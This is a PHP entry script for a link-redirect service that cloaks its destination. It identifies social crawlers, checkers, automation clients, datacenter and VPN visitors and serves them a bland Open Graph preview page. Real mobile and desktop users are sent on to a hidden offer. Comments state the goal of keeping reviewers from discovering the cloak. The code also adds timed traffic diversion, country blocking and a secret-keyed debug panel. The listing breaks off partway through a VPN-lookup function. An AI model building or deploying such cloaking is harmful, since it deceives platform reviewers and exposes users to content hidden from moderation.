<?php

declare(strict_types=1);

use Srp\Redirect\FilterEngine;
use Srp\Redirect\GeoResolver;

require_once dirname(__DIR__) . '/env.php';

load_env_file(dirname(__DIR__) . '/.env');

// Safety net: error display is force-disabled unconditionally on this live
// entry point (matching every other entry point in the codebase). Errors go to
// the log only and must never leak to the response body, regardless of php.ini
// or APP_DEBUG.
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
if (filter_var(app_env('APP_DEBUG', '0') ?? '0', FILTER_VALIDATE_BOOL)) {
    error_log('[SRP] WARNING: APP_DEBUG=1 is set on a live entry point. display_errors forced off.');
}

/*
 * SRP entry handler.
 * Supported public token formats:
 * - legacy sub_id (base64url, CSV):
 *   [0]=?,
 *   [1]=click_id,
 *   [2]=?,
 *   [3]=canonical_url,
 *   [4]=user_lp,
 *   [5]=title,
 *   [6]=image_url,
 *   [7]=lg (landing|1=>landing, landing2|2=>landing2, direct|0|null|legacy|unknown=>direct)
 *   [8]=block_vpn_asn (0|1)
 * - short code: s-<code>
 */
$failBootstrap = static function (string $message): never {
    http_response_code(500);
    header('Content-Type: text/plain; charset=UTF-8');
    header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Expires: 0');
    header('X-Content-Type-Options: nosniff');
    error_log($message);
    exit('Internal Server Error');
};

$autoloadPath = dirname(__DIR__) . '/vendor/autoload.php';
if (!is_file($autoloadPath) || !is_readable($autoloadPath)) {
    $failBootstrap('Missing Composer autoload: ' . $autoloadPath);
}

try {
    require_once $autoloadPath;
} catch (Throwable $e) {
    $failBootstrap('Composer autoload bootstrap failed: ' . $e->getMessage());
}

$requiredFiles = [
    dirname(__DIR__) . '/asset_url.php',
    dirname(__DIR__) . '/ip_address.php',
    dirname(__DIR__) . '/Base64URL.php',
    __DIR__ . '/functions.php',
    __DIR__ . '/GeoResolver.php',
    __DIR__ . '/FilterEngine.php',
    __DIR__ . '/public_link.php',
    __DIR__ . '/redirect_payload.php',
];

foreach ($requiredFiles as $requiredFile) {
    if (!is_file($requiredFile) || !is_readable($requiredFile)) {
        $failBootstrap('Missing required bootstrap file: ' . $requiredFile);
    }

    require_once $requiredFile;
}

const SRP_TARGET_BASE = '/_meetups/';
// Hardcoded fallback only — the effective value is $blockUrl below, which
// prefers SRP_BLOCK_URL from .env (same arrangement as SRP_FILTER_URL).
const SRP_BLOCK_URL = 'https://www.youtube.com/';
const SRP_DEFAULT_CANONICAL = 'https://www.denic.de/';
const SRP_GEOIP2LITE_DB = __DIR__ . '/databases/GeoLite2-Country.mmdb';
const SRP_GEOIP2ASN_DB = __DIR__ . '/databases/GeoLite2-ASN.mmdb';
const SRP_CF_INSIGHTS_SCRIPT = 'https://static.cloudflareinsights.com';
const SRP_CF_INSIGHTS_BEACON = 'https://cloudflareinsights.com';
const SRP_FB_APP_ID = '115190258555800';

// Timed filter mode: 2 min filter → 3 min normal → repeat (5-min cycle)
// SRP_FILTER_URL = hardcoded fallback only; runtime URL comes from cache file or env
const SRP_FILTER_URL = '';
const SRP_CYCLE_LENGTH = 300; // seconds total per cycle (2+3 min)
const SRP_FILTER_DURATION = 120; // seconds at start of cycle = filter window
const SRP_CACHE_DIR_NAME = 'srp_bb'; // shared tmp subdir for all SRP caches

/**
 * Known hosting / cloud / datacenter ASNs — these are NOT residential ISPs.
 * When an IP belongs to one of these ASNs, it is highly likely to be a
 * proxy, VPN, VPS, or cloud-hosted scraper rather than a real mobile user.
 *
 * This list is intentionally narrow to avoid false positives. Organization-name
 * heuristics catch the rest.
 *
 * Must stay with the other constants up here: `const` at file scope is a runtime
 * statement and is NOT hoisted, while function declarations are. Declaring this
 * next to srp_is_hosting_ip() further down the file made the constant undefined
 * at the point the main flow calls that function.
 *
 * @see srp_is_hosting_org()
 */
const SRP_HOSTING_ASNS = [
    16509,   // Amazon.com / AWS
    14618,   // Amazon AWS
    8987,    // Amazon (Ireland)
    396982,  // Google Cloud Platform
    15169,   // Google LLC
    8075,    // Microsoft Azure
    8068,    // Microsoft Corporation
    8069,    // Microsoft (Azure)
    14061,   // DigitalOcean
    24940,   // Hetzner Online
    16276,   // OVH SAS
    63949,   // Linode (Akamai)
    20473,   // Vultr / Choopa
    36352,   // ColoCrossing
    36351,   // SoftLayer (IBM Cloud)
    4323,    // Twilio / SendGrid (cloud infra)
    12876,   // Online SAS / Scaleway
    197540,  // netcup
    3320,    // Deutsche Telekom AG (datacenter ranges — broad, paired with org check)
    51167,   // Contabo
    40021,   // Contabo
    141995,  // Contabo
    47583,   // Hostinger
    53667,   // Namecheap
    22612,   // Namecheap
    7979,    // Servers.com
    46844,   // Sharktech
    137951,  // Alibaba Cloud
    45102,   // Alibaba Cloud
    132203,  // Tencent Cloud
    26496,   // GoDaddy (hosting)
    398101,  // GoDaddy
    55286,   // OVH US
];

require_once __DIR__ . '/render_og.php';
require_once __DIR__ . '/render_landing.php';
require_once __DIR__ . '/render_landing_2.php';

/**
 * Blocked countries for the direct-mode gate below.
 *
 * Byte-identical to meetup_blocked_countries() in redirect/sanitize.php on
 * purpose: both gates read the same SRP_BLOCK_COUNTRIES value, and the
 * comparison at the gate is a STRICT in_array(), so any difference in parsing
 * makes them disagree. This copy previously mapped 'strtoupper' with no trim
 * and filtered on truthiness only, so "ID, SG" produced ['ID', ' SG'] here but
 * ['ID', 'SG'] in the _meetups hop — every code after the first comma stopped
 * matching on this path while still matching on the other.
 *
 * It cannot simply delegate: sanitize.php is the _meetups helper and is not
 * loaded by this entry point, and pulling it onto the redirect hot path for one
 * function would drag the MEETUP_* names in with it.
 *
 * @var list<string> $blockedCountries
 */
$blockedCountries = array_values(
    array_filter(
        array_map(
            static fn (string $code): string => strtoupper(trim($code)),
            explode(',', (string) app_env('SRP_BLOCK_COUNTRIES', 'ID')),
        ),
        static fn (string $code): bool => $code !== '',
    ),
);

// Where blocked countries are sent. Env-configurable like SRP_FILTER_URL, so it
// can be changed from the .env editor without touching code. Validated with the
// same https-only rule the filter URL uses; anything invalid falls back to the
// SRP_BLOCK_URL constant rather than emitting a broken Location header.
$blockUrl = srp_sanitize_https_url(trim((string) app_env('SRP_BLOCK_URL', '')))
    ?? SRP_BLOCK_URL;

// Self-referral guard: a block URL pointing back at this redirect domain would
// loop. Fall back to the built-in default rather than emitting it.
if (srp_url_is_self($blockUrl)) {
    $blockUrl = SRP_BLOCK_URL;
}

// Cloak diagnostics, gated on a shared secret in the query string: the panel
// appears only for ?dbg=<SRP_CLOAK_DEBUG_KEY>. Crawlers and reviewers do not
// have the key, so they keep seeing the plain OG page and the cloak stays
// unannounced — while the panel is reachable from any IP for testing.
//
// hash_equals() because this is a secret comparison; an empty key disables the
// feature outright, so a deployment that never sets it can never expose it.
$cloakDebugKey = trim((string) app_env('SRP_CLOAK_DEBUG_KEY', ''));
$cloakDebugParam = isset($_GET['dbg']) && is_string($_GET['dbg']) ? $_GET['dbg'] : '';
$cloakDebug = $cloakDebugKey !== ''
    && $cloakDebugParam !== ''
    && hash_equals($cloakDebugKey, $cloakDebugParam);

$allowCloudflareInsights = filter_var(
    app_env('SRP_ALLOW_CLOUDFLARE_INSIGHTS', '0') ?? '0',
    FILTER_VALIDATE_BOOL,
);

header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: no-referrer');
header('X-Frame-Options: DENY');
header('Permissions-Policy: geolocation=(), microphone=(), camera=(), interest-cohort=()');
header(
    "Content-Security-Policy: default-src 'none'; "
    . "img-src 'self' https:; "
    . "script-src 'self'"
    . ($allowCloudflareInsights ? ' ' . SRP_CF_INSIGHTS_SCRIPT : '')
    . "; "
    . "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "
    . "font-src 'self' https://fonts.gstatic.com; "
    . "connect-src 'self'"
    . ($allowCloudflareInsights ? ' ' . SRP_CF_INSIGHTS_BEACON : '')
    . "; "
    . "frame-ancestors 'none'; "
    . "base-uri 'self'; "
    . "form-action 'none'",
);

if (srp_is_https()) {
    header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
}

// Step 1 — IP
$userIp = srp_normalize_ip(getUserIP());

// Step 2 — Social bot detection (early, before geo lookup and rate limit)
$userAgent = srp_server_string('HTTP_USER_AGENT');
$isSocialBot = srp_is_social_bot($userAgent);

// Redirect checkers / trackers / preview / validators are treated like preview
// bots: they are served OG meta tags (HTTP 200) instead of the real offer
// redirect, and like social bots they skip the rate limit, geo block, and timed
// filter. Three signals feed this, covering spoofed-mobile probes
// (srp_is_suspicious_mobile_probe) AND desktop automation clients
// (srp_is_automation_client), so a curl/wget/headless checker that does NOT
// pretend to be a phone is still cloaked. Real browsers (mobile or desktop) are
// NOT affected.
$isPreviewProbe = $isSocialBot
    || srp_is_suspicious_mobile_probe($userAgent)
    || srp_is_automation_client($userAgent);

// Rate limit: 60 requests/minute/IP using file-based token bucket.
// Expensive (geo, proxy check, DB) paths are protected. Social bots skip the limit
// to ensure OG scrapers always get meta tags for link previews.
//
// Keying fallback: $userIp is '' only when getUserIP() could not extract any
// valid IP literal at all (malformed/absent REMOTE_ADDR). Without a fallback,
// every such request collapses onto the same rl_<md5('')> bucket, so unrelated
// clients would share — and could exhaust — one another's quota. Raw
// REMOTE_ADDR is the actual TCP peer as seen by the web server and cannot be
// spoofed via headers, so it still distinguishes separate sources even when it
// is not a validated IP literal; only a truly empty REMOTE_ADDR falls through
// to the shared bucket, which is not avoidable without any signal at all.
$rateLimitIdentity = $userIp !== '' ? $userIp : ('raw:' . srp_server_string('REMOTE_ADDR'));
$rateLimitKey   = 'rl_' . md5($rateLimitIdentity);
$rateLimitDir   = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . SRP_CACHE_DIR_NAME;
$rateLimitFile  = $rateLimitDir . DIRECTORY_SEPARATOR . $rateLimitKey . '.json';
$rateLimitMax   = 60;  // requests per window
$rateLimitWindow = 60; // seconds

$rateLimited = false;
if (!$isPreviewProbe) {
    // Read-modify-write the token bucket under a single exclusive lock so
    // concurrent requests cannot all observe the same stale count (TOCTOU).
    // Schema unchanged: {'c': <count>, 't': <window-start-epoch>}.
    if (!srp_ensure_private_dir($rateLimitDir)) {
        $rateLimited = false;
    } else {
        // Fail-open by design: if the bucket file can't be opened or locked
        // (disk/permission fault), let the request through rather than block
        // legitimate traffic on a rate-limit I/O error.
        $rlFp = @fopen($rateLimitFile, 'c+');
    if ($rlFp !== false) {
            if (flock($rlFp, LOCK_EX)) {
                $raw    = (string) stream_get_contents($rlFp, 128, 0);
                $rlData = $raw !== '' ? json_decode($raw, true) : null;

                $now   = time();
                $count = 1;
                $start = $now;

                if (is_array($rlData) && isset($rlData['c'], $rlData['t'])) {
                    $elapsed = $now - (int) $rlData['t'];
                    if ($elapsed < $rateLimitWindow) {
                        $count = (int) $rlData['c'] + 1;
                        $start = (int) $rlData['t'];
                    }
                }

                if ($count > $rateLimitMax) {
                    $rateLimited = true;
                } else {
                    rewind($rlFp);
                    ftruncate($rlFp, 0);
                    fwrite($rlFp, (string) json_encode(['c' => $count, 't' => $start]));
                    fflush($rlFp);
                }

                flock($rlFp, LOCK_UN);
            }
            fclose($rlFp);
        }
    }

    if ($rateLimited) {
        http_response_code(429);
        header('Retry-After: ' . $rateLimitWindow);
        header('Content-Type: text/plain; charset=UTF-8');
        exit('Rate limit exceeded. Try again later.');
    }
}

// Step 3 — Geo + country block only for real users (skip expensive MaxMind for crawlers)
// Capture raw CF-IPCountry before normalization — srp_header_country_code() discards T1
// for geo purposes, but T1 must still reach the proxy/VPN check in step 4.
$cfRawCountry = '';
$countryCode = 'XX';
$countryBlocked = false;
$isCloakedAsn = false;
if (!$isPreviewProbe) {
    $cfRawCountry = strtoupper(trim(srp_server_string('HTTP_CF_IPCOUNTRY')));
    $countryCode = srp_request_country_code($userIp);

    // Only recorded here, not acted on: a landing-mode link must stay reachable
    // from every country, and $lg is not known until the token is decoded far
    // below. The block is applied there instead — see "Country block" further
    // down. Geo resolution itself still happens here so the filter check in
    // step 5 and the redirect payload keep using the same $countryCode.
    $countryBlocked = in_array($countryCode, $blockedCountries, true);

    // Cloaking: datacenter / VPN / scraper networks are served the OG page
    // instead of the offer. Evaluated here — AFTER the rate limiter above, so
    // unlike a UA-detected crawler this traffic still counts against the bucket
    // and cannot be used to flood the endpoint. Reuses the same 24h asn_ cache
    // entry the proxy check would populate, so it costs no extra MMDB read.
    $isCloakedAsn = srp_is_blocked_asn($userIp);

    // Hosting/cloud/datacenter detection. Feeds the cloak decision alongside
    // $isCloakedAsn and $proxyVpnStatus, all three gated by the $blockVpnAsn
    // toggle in srp_traffic_decision(). Local MaxMind only — no network call —
    // and srp_resolve_asn() is already memoized per request (shared with the
    // blocked-ASN lookup above), so this costs an in_array() plus one regex.
    $isHosting = srp_is_hosting_ip($userIp);
}

// Step 4 — Token extraction and early validation.
// Validated before the filter check so invalid tokens always return 400,
// never leak into the filter redirect path.
$publicToken = isset($_GET['sub_id']) && is_string($_GET['sub_id']) ? trim($_GET['sub_id']) : '';
if ($publicToken === '' || strlen($publicToken) > 2048 || preg_match('/^[A-Za-z0-9_-]+$/', $publicToken) !== 1) {
    http_response_code(400);
    exit;
}

// Per-link block flag: legacy tokens embed an explicit block_vpn_asn (CSV index
// 8) when generated by the portal. Read once here so the timed-filter and
// proxy/VPN decisions in step 5 use the same value. Absent → null → global.
$linkBlockVpnAsn = null;
$earlyLink = srp_public_link_decode_legacy_token($publicToken);
if (is_array($earlyLink)) {
    $linkBlockVpnAsn = $earlyLink['block_vpn_asn'] ?? null;
}

// Step 5 — Timed filter mode: 2 min filter / 3 min normal, repeating
// Filter: mobile (non-tablet) → redirect to SRP_FILTER_URL. With the VPN/ASN
// block ON only confirmed-clean mobile is diverted; with the block OFF any
// mobile visitor (incl. VPN/proxy/blocked-ASN) is diverted like normal traffic.
// If SRP_FILTER_URL is not configured (null), filter is skipped → normal flow.
// Mobile Detect (mobiledetect.net) instantiated once here; reused for $deviceType.
//
// Like the country block above, the outcome is only RECORDED here and acted on
// once $lg is known: a landing-mode link must reach the landing page on both
// wap (mobile) and web (desktop), so it is exempt from the filter diversion.
// The timing/URL snapshot and the proxy check still run here so the decision is
// taken from the same cycle instant as before.
$filterDivertUrl = null;
$blockVpnAsn = $linkBlockVpnAsn ?? true;    // default: block VPN/proxy + blocked-ASN (fail-closed)
$proxyVpnStatus = null; // tri-state, resolved once per request when needed
$isHosting = $isHosting ?? null; // null for preview probes: the block above is skipped
$mobileDetect = $isPreviewProbe ? null : srp_mobile_detect($userAgent);
if ($mobileDetect !== null) {
    // One engine instance so isFilterMode() and getFilterUrl() read the same
    // atomic filter_config.json snapshot (no torn timing/URL across two files).
    $filterEngine = new FilterEngine(
        SRP_CACHE_DIR_NAME,
        SRP_FILTER_DURATION,
        SRP_CYCLE_LENGTH,
        SRP_FILTER_URL,
    );

    $blockVpnAsn = $linkBlockVpnAsn ?? $filterEngine->getBlockVpnAsn();

    // Resolve proxy/VPN status only when the VPN/ASN block is ON: the cloak
    // decision below needs it, and when the block is OFF the filter window
    // diverts any mobile visitor regardless of reputation (see
    // srp_should_divert_to_filter). Skip the lookup when the IP is already on
    // the blocked-ASN list — blocked either way, so the verdict cannot change
    // the outcome. blackbox results are cached per IP for 1h.
    // Skip the lookup when the verdict cannot change the outcome: a blocked ASN
    // or confirmed hosting IP is cloaked either way. srp_is_proxy_or_vpn() may
    // reach the network (blackbox), so this is also a latency win.
    if ($blockVpnAsn && !$isCloakedAsn && $isHosting !== true) {
        $proxyVpnStatus = srp_is_proxy_or_vpn($countryCode, $userIp, $cfRawCountry);
    }

    if ($filterEngine->isFilterMode()) {
        $filterUrl = $filterEngine->getFilterUrl();

        // Self-referral guard: a filter URL on this same domain would loop.
        if ($filterUrl !== null && srp_url_is_self($filterUrl)) {
            $filterUrl = null;
        }

        if ($filterUrl === null) {
            // Filter window is active but no valid filter URL is configured, so
            // filtering is silently inert. Log it (throttled) so the misconfig is
            // visible instead of failing open without a trace.
            srp_log_filter_misconfig();
        } elseif (
            // Divert decision extracted to a pure, unit-tested helper
            // (srp_should_divert_to_filter): block ON → only CONFIRMED-clean
            // mobile; block OFF → any mobile visitor follows the window.
            srp_should_divert_to_filter(
                srp_device_type($mobileDetect),
                $proxyVpnStatus,
                $blockVpnAsn,
            )
        ) {
            $filterDivertUrl = $filterUrl;
        }
    }
}

// Decoded once at step 4 above into $earlyLink. $publicToken has not been
// reassigned since, and the decoder is pure (base64url + CSV parse, no I/O),
// so re-decoding here would repeat the whole parse for an identical result.
$publicLink = $earlyLink;

if ($publicLink === null) {
    $shortCode = srp_public_link_extract_short_code($publicToken);

    if ($shortCode === null) {
        http_response_code(400);
        exit;
    }

    try {
        /** @var PDO $publicLinkPdo */
        $publicLinkPdo = require __DIR__ . '/connection.config.php';

        // Check active srp_short_links table first; fall back to legacy shortlinks.
        $publicLink = srp_short_link_find($publicLinkPdo, $shortCode);

        if ($publicLink === null) {
            $shortlinkRow = srp_shortlinks_find($publicLinkPdo, $shortCode);

            if ($shortlinkRow !== null) {
                $slLongUrl = trim((string) $shortlinkRow['long_url']);
                $slOgTitle = $shortlinkRow['og_title'];
                $slLongScheme = strtolower((string) parse_url($slLongUrl, PHP_URL_SCHEME));

                if (
                    filter_var($slLongUrl, FILTER_VALIDATE_URL) === false
                    || $slLongScheme !== 'https'
                ) {
                    http_response_code(404);
                    exit;
                }

                if (!srp_url_is_self($slLongUrl) && !srp_url_host_allowed($slLongUrl)) {
                    error_log('[srp] legacy shortlink target blocked — host not allowed: ' . strtolower((string) parse_url($slLongUrl, PHP_URL_HOST)));
                    http_response_code(404);
                    exit;
                }

                // Accept only HTTPS images because the same-origin proxy fetcher is HTTPS-only.
                $slOgImageRaw = trim((string) $shortlinkRow['og_image']);
                $slOgImageScheme = strtolower((string) parse_url($slOgImageRaw, PHP_URL_SCHEME));
                $slOgImage = (
                    $slOgImageRaw !== ''
                    && $slOgImageScheme === 'https'
                    && filter_var($slOgImageRaw, FILTER_VALIDATE_URL) !== false
                )
                    ? $slOgImageRaw
                    : '';

                // Legacy shortlinks now go through the SAME traffic decision as
                // normal links, so a checker / blocked country / VPN / filter
                // window can no longer reach long_url uncloaked. The only
                // difference is the final REDIRECT target: straight to long_url
                // (legacy links never enter the _meetups click hop).
                $slDecision = srp_traffic_decision(
                    $isPreviewProbe,
                    $blockVpnAsn,
                    $isCloakedAsn,
                    $proxyVpnStatus,
                    $isHosting,
                    'direct',
                    $countryBlocked,
                    $filterDivertUrl,
                );

                switch ($slDecision['action']) {
                    case 'CLOAK':
                        srp_render_og((string) $slOgTitle, $slOgImage);
                        exit;

                    case 'BLOCK_COUNTRY':
                        header('Location: ' . $blockUrl, true, 302);
                        exit;

                    case 'DIVERT_FILTER':
                        header('Location: ' . $filterDivertUrl, true, 302);
                        exit;

                    case 'REDIRECT':
                    default:
                        header('Location: ' . $slLongUrl, true, 302);
                        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
                        exit;
                }
            }
        }
    } catch (Throwable $e) {
        error_log('Public short link lookup failed: ' . $e->getMessage());
        http_response_code(500);
        exit;
    }

    if ($publicLink === null) {
        http_response_code(404);
        exit;
    }
}

$clickId = srp_sanitize_token($publicLink['click_id'], 64);
$userLp = srp_sanitize_token($publicLink['user_lp'], 64);
$canonicalUrl = srp_sanitize_https_url($publicLink['canonical_url']) ?? SRP_DEFAULT_CANONICAL;
$imageUrl = srp_sanitize_https_url($publicLink['image_url']) ?? '';
$title = srp_sanitize_title($publicLink['title']);
$lg = srp_normalize_lg($publicLink['lg']);

if ($clickId === null || $userLp === null) {
    http_response_code(400);
    exit;
}

// Diversions deferred from steps 3 and 5, applied here now that $lg is known.
//
//   landing → wap/web  : always renders the landing page, every country.
//   direct  → wap/web  : unchanged — blocked country goes to SRP_BLOCK_URL,
//                        and the timed filter still diverts when its window
//                        is open.
//
// Routing decision — cloak / country block / filter diversion / normal redirect.
// The ordering rules and the reason vocabulary live in the function's docblock.
//
//   $isPreviewProbe — crawler or probe identified by user agent
//   $isCloakedAsn   — IP on the blocked-ASN list (datacenter / VPN / scraper)
//   $proxyVpnStatus — tri-state from srp_is_proxy_or_vpn() (true = VPN/proxy)
//   $isHosting      — hosting/cloud/datacenter IP (curated ASN list + org heuristic)
//   $blockVpnAsn    — portal toggle: when ON, blocked-ASN, hosting AND VPN/proxy
//                     traffic is cloaked; when OFF, all three follow the redirect.
$decision = srp_traffic_decision(
    $isPreviewProbe,
    $blockVpnAsn,
    $isCloakedAsn,
    $proxyVpnStatus,
    $isHosting,
    $lg,
    $countryBlocked,
    $filterDivertUrl,
);

switch ($decision['action']) {
    case 'CLOAK':
        $cloakDebugInfo = [];

        if ($cloakDebug) {
            $debugAsn = srp_resolve_asn($userIp);
            $debugProxy = $proxyVpnStatus ?? srp_is_proxy_or_vpn($countryCode, $userIp, $cfRawCountry);

            $cloakDebugInfo = [
                'reason'     => $decision['reason'],
                'click_id'   => $clickId,
                'network'    => strtoupper($userLp),
                'mode'       => $lg,
                'ip'         => $userIp !== '' ? $userIp : '(unknown)',
                'country'    => $countryCode,
                'cf_country' => $cfRawCountry !== '' ? $cfRawCountry : '(none)',
                'asn'        => isset($debugAsn['asn']) ? 'AS' . $debugAsn['asn'] : '(unresolved)',
                'asn_org'    => $debugAsn['org'] ?? '(unresolved)',
                'vpn_proxy'  => $debugProxy === null ? 'unknown' : ($debugProxy ? 'yes' : 'no'),
                'device'     => srp_device_type($mobileDetect ?? srp_mobile_detect($userAgent)),
                'user_agent' => $userAgent !== '' ? $userAgent : '(empty)',
                'host'       => srp_server_string('HTTP_HOST'),
                'time_utc'   => gmdate('Y-m-d H:i:s'),
            ];
        }

        // Landing-mode links served to a preview bot render the SAME landing
        // page real users see (safe CTA, no live offer link), so the social
        // preview is consistent with the destination. Anti-fraud cloaks
        // (blocked-asn / hosting / vpn-proxy) keep the plain OG page and never
        // reach the offer.
        if ($decision['reason'] === 'user-agent' && srp_is_landing_lg($lg)) {
            if ($lg === 'landing2') {
                srp_render_landing_2('', $allowCloudflareInsights, 'WEB', true, $clickId);
            } else {
                $previewHost = srp_server_string('HTTP_HOST');
                srp_render_landing(
                    '',
                    $allowCloudflareInsights,
                    'WEB',
                    true,
                    [
                        'title' => $title !== '' ? $title : 'Attention',
                        'description' => trim((string) app_env('SRP_OG_DESCRIPTION', 'Open this link to view the content.')),
                        'image' => srp_proxy_image_url($imageUrl),
                        'site_name' => srp_validate_host($previewHost)
                            ? (preg_replace('/:\d+$/', '', $previewHost) ?? $previewHost)
                            : '',
                        'url' => srp_validate_host($previewHost)
                            ? 'https://' . $previewHost . srp_server_string('REQUEST_URI')
                            : '',
                    ],
                );
            }
            exit;
        }

        srp_render_og($title, $imageUrl, $cloakDebugInfo);
        exit;

    case 'BLOCK_COUNTRY':
        header('Location: ' . $blockUrl, true, 302);
        exit;

    case 'DIVERT_FILTER':
        header('Location: ' . $filterDivertUrl, true, 302);
        exit;

    case 'REDIRECT':
        // Falls through to the normal path below. Written explicitly rather
        // than left implicit: a switch without this case would let an
        // unrecognised action reach the offer, which is fail-open on a
        // cloaking decision.
        break;
}

$deviceType = srp_device_type($mobileDetect ?? srp_mobile_detect($userAgent));

try {
    $redirectToken = srp_redirect_payload_encode(
        strtoupper($clickId),
        $countryCode,
        $deviceType,
        $userIp,
        strtoupper($userLp),
    );
} catch (Throwable $e) {
    error_log('Redirect payload encode failed: ' . $e->getMessage());
    http_response_code(500);
    exit;
}

$target = SRP_TARGET_BASE . '?rk=' . rawurlencode($redirectToken);

switch ($lg) {
    case 'direct':
        header('Location: ' . $target, true, 302);
        exit;

    case 'landing':
        srp_render_landing($target, $allowCloudflareInsights, $deviceType);
        exit;

    case 'landing2':
        srp_render_landing_2($target, $allowCloudflareInsights, $deviceType, false, $clickId);
        exit;

    default:
        http_response_code(400);
        exit;
}

// ── Pure functions moved to redirect/functions.php ───────────────────────────
// srp_sanitize_token, srp_sanitize_title, srp_sanitize_https_url,
// srp_normalize_lg, srp_device_type, srp_is_social_bot,
// srp_header_country_code, srp_geo_country_code, srp_normalize_ip,
// srp_is_valid_ip, srp_is_https, srp_server_string, srp_validate_host, srp_e

/**
 * Resolve country code with header priority + GeoIP fallback.
 *
 * HTTP_CF_IPCOUNTRY is a client-supplied request header like any other — it is
 * only trustworthy when it was actually set by Cloudflare's edge, i.e. when the
 * connecting peer (REMOTE_ADDR) is inside a known Cloudflare/trusted-proxy CIDR
 * (the same check ip_address.php already applies to CF-Connecting-IP etc.).
 * HTTP_GEOIP_COUNTRY_CODE has no legitimate non-spoofable source at all and is
 * dropped. GEOIP_COUNTRY_CODE (no HTTP_ prefix) is a server/env variable, not a
 * request header, so it stays unconditionally trusted.
 */
function srp_request_country_code(string $ip): string
{
    $remoteAddr = isset($_SERVER['REMOTE_ADDR']) && is_string($_SERVER['REMOTE_ADDR'])
        ? trim($_SERVER['REMOTE_ADDR'])
        : '';
    $trustedEdge = $remoteAddr !== '' && srp_ip_is_trusted_proxy($remoteAddr);

    $headerKeys = $trustedEdge
        ? ['HTTP_CF_IPCOUNTRY', 'GEOIP_COUNTRY_CODE']
        : ['GEOIP_COUNTRY_CODE'];

    foreach ($headerKeys as $headerKey) {
        $countryCode = srp_header_country_code($headerKey);

        if ($countryCode !== null) {
            return $countryCode;
        }
    }

    return srp_geo_country_code(srp_geo_lookup($ip));
}

// ── GeoIP lookup (I/O — MMDB + file cache) ───────────────────────────────────
// Delegated to GeoResolver class. Legacy wrapper kept for backward compat.

/**
 * @return array<string, mixed>
 * @deprecated Use GeoResolver directly.
 */
function srp_geo_lookup(string $ip): array
{
    /** @var GeoResolver|null $resolver */
    static $resolver = null;
    if ($resolver === null) {
        $resolver = new GeoResolver(SRP_GEOIP2LITE_DB, SRP_CACHE_DIR_NAME);
    }

    return $resolver->resolve($ip);
}

// ── Filter engine (I/O — file cache + env) ───────────────────────────────────
// Delegated to the FilterEngine class, instantiated directly in the hot path
// above. The deprecated srp_filter_timing()/srp_is_filter_mode()/srp_filter_url()
// wrappers were removed after the hot path stopped using them (no other callers).

/**
 * Log the "filter window active but no URL configured" misconfiguration at most
 * once per cycle, using a marker file in the cache dir to throttle. Only reached
 * during an actual misconfiguration, so it adds no cost to normal operation.
 */
function srp_log_filter_misconfig(): void
{
    $dir = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . SRP_CACHE_DIR_NAME;
    $marker = $dir . DIRECTORY_SEPARATOR . 'filter_misconfig.marker';

    $mtime = is_file($marker) ? filemtime($marker) : false;
    if ($mtime !== false && (time() - $mtime) < SRP_CYCLE_LENGTH) {
        return; // already logged within this cycle
    }

    if (!is_dir($dir)) {
        @mkdir($dir, 0700, true);
    }
    @touch($marker);
    error_log('[srp] Filter window active but no valid SRP_FILTER_URL configured; filtering is inert.');
}

/**
 * Proxy/VPN status as a tri-state:
 *   true  = confirmed proxy/VPN/Tor/cloud (definitive signal)
 *   false = confirmed clean (residential / mobile carrier)
 *   null  = unknown (no usable IP, or the reputation API timed out/errored)
 *
 * Callers that gate a privileged action on "confirmed clean" MUST test for an
 * explicit `=== false` (fail-closed on null), never `!result` — see the filter
 * window in the hot path.
 */
function srp_is_proxy_or_vpn(string $countryCode, string $ip, string $cfRawCountry = ''): ?bool
{
    // Cloudflare marks Tor exit nodes and known VPN infrastructure as T1.
    // Check $cfRawCountry (raw header) first — srp_header_country_code() discards T1
    // for geo-blocking purposes, so it never reaches $countryCode.
    if ($cfRawCountry === 'T1' || $countryCode === 'T1') {
        return true;
    }

    // Explicit proxy-signature headers — only present when client is behind
    // an additional proxy layer (not injected by Cloudflare itself)
    foreach (['HTTP_VIA', 'HTTP_PROXY_CONNECTION', 'HTTP_X_PROXY_ID'] as $header) {
        if (isset($_SERVER[$header]) && trim((string) $_SERVER[$header]) !== '') {
            return true;
        }
    }

    // ASN-based hosting/cloud detection — local MaxMind lookup, no network call.
    // Known hosting/datacenter ASNs are near-certain non-residential IPs.
    if ($ip !== '' && srp_is_valid_ip($ip)) {
        $isHosting = srp_is_hosting_ip($ip);

        if ($isHosting === true) {
            return true;
        }
    }

    // blackbox.ipinfo.app v1 — VPN / proxy / Tor / cloud/hosting detection.
    // Returns ?bool: true = flagged, false = clean, null = timeout/error.
    if ($ip !== '' && srp_is_valid_ip($ip)) {
        return srp_blackbox_lookup($ip);
    }

    // No usable IP to check → status unknown.
    return null;
}

/**
 * Query blackbox.ipinfo.app v1 (GET /api/v1/{ip}) for VPN/proxy/Tor/cloud.
 * v1 replies with a single char (Y/N/E); a JSON flag object is also accepted.
 * Result cached in sys_get_temp_dir() for 1 hour per IP.
 * Returns null on timeout or API error (caller falls back to false).
 */
function srp_blackbox_lookup(string $ip): ?bool
{
    $cacheDir = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . SRP_CACHE_DIR_NAME;
    $cacheFile = $cacheDir . DIRECTORY_SEPARATOR . 'vpn_' . md5($ip) . '.json';
    $cacheTtl = 3600;
    // "Unknown" (timeout/error) is cached too, but only briefly: long enough that
    // an upstream outage cannot make every request pay the connect/read timeout,
    // short enough that recovery is picked up within a minute.
    $unknownCacheTtl = 60;

    if (is_file($cacheFile)) {
        $mtime = filemtime($cacheFile);

        if ($mtime !== false) {
            $age = time() - $mtime;
            $cachedContent = file_get_contents($cacheFile);
            $cached = is_string($cachedContent) ? json_decode($cachedContent, true) : null;

            if (is_array($cached) && array_key_exists('r', $cached)) {
                if (is_bool($cached['r']) && $age < $cacheTtl) {
                    return $cached['r'];
                }

